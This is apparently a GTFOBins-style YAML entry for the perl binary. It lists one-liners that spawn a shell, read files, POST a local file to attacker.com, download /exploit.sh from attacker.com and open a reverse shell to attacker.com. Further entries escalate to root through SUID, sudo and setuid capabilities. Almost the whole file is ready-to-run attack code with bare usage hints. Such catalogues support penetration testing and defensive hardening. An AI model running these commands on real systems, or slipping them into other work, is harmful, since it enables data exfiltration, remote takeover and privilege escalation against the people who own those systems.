---
functions:
  shell:
    - code: perl -e 'exec "/bin/sh";'
  file-read:
    - code: |
        LFILE=file_to_read
        perl -ne print $LFILE
  file-upload:
    - description: Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.
      code: |
        export RHOST=attacker.com
        export RPORT=8080
        export LFILE=file_to_send
        perl -MIO::Socket::INET -e '$s = new IO::Socket::INET(PeerAddr=>$ENV{"RHOST"}, PeerPort=>$ENV{"RPORT"}, Proto=>"tcp") or die;open(my $file, "<", $ENV{"LFILE"}) or die;$content = join("", <$file>);close($file);$post_data = "d=" . $content;$headers = "POST / HTTP/1.1\r\nHost: " . $ENV{"RHOST"} . "\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " . length($post_data) . "\r\nConnection: close\r\n\r\n";print $s $headers . $post_data;while (<$s>) { }close($s);'
  file-download:
    - description: Download a file via HTTP. For example, run `python3 -m http.server 8080` on the serving side.
      code: |
        export RHOST=attacker.com
        export RPORT=8080
        export URL=/exploit.sh
        export LFILE=output.txt
        perl -MIO::Socket::INET -e '$s=new IO::Socket::INET(PeerAddr=>$ENV{"RHOST"},PeerPort=>$ENV{"RPORT"},Proto=>"tcp") or die; print $s "GET " . $ENV{"URL"} . " HTTP/1.1\r\nHost: " . $ENV{"RHOST"} . "\r\nMetadata: true\r\nConnection: close\r\n\r\n"; open(my $fh, ">", $ENV{"LFILE"}) or die; $in_content = 0; while (<$s>) { if ($in_content) { print $fh $_; } elsif ($_ eq "\r\n") { $in_content = 1; } } close($s); close($fh);'
  reverse-shell:
    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        perl -e 'use Socket;$i="$ENV{RHOST}";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
  suid:
    - code: ./perl -e 'exec "/bin/sh";'
  sudo:
    - code: sudo perl -e 'exec "/bin/sh";'
  capabilities:
    - code: ./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
---
